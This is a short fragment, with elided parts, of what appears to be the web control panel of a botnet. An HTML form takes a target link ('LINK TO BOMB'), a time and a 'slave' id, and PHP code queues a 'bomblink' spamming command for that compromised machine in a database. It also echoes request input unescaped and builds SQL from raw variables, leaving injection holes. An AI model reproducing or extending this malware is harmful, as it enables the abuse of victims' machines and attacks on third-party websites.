...
<br>
<input type="text" class="inputbox" placeholder="LINK TO BOMB" name="target">
<br><br>
<input type="text" class="inputbox" placeholder="OPEN TIME" name="time">
<br><br>
<input type="text" class="inputbox" value="<? echo $_GET['slave'] ?>" name="slave" disabled>
<br><br>
<input type="submit" class="submitbox" value="START SPAMMING URL" name="submit">
</form>
</center>
</body>
</html>
...
$update_query = "UPDATE slaves SET command='bomblink' WHERE id='$slave_id'";
mysql_query($update_query, $connect);
$add_command = "INSERT INTO  commands (slave_id, command, status, content)
VALUES ('$slave_id', 'bomblink', 'pending', '$fullcommand')";
